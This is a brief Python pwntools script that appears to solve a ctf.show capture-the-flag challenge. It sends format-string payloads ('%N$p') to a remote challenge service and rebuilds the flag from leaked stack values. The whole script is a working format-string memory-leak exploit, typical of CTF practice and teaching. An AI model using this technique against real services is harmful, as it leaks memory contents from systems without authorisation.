from pwn import *
context(arch = 'i386',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28299)
flag=''
for i in range(6,6+12):
    payload='%{}$p'.format(str(i))
    io.sendlineafter('$ ',payload)
    aim = unhex(io.recvuntil('\n',drop=True).replace('0x',''))
    flag += aim[::-1]
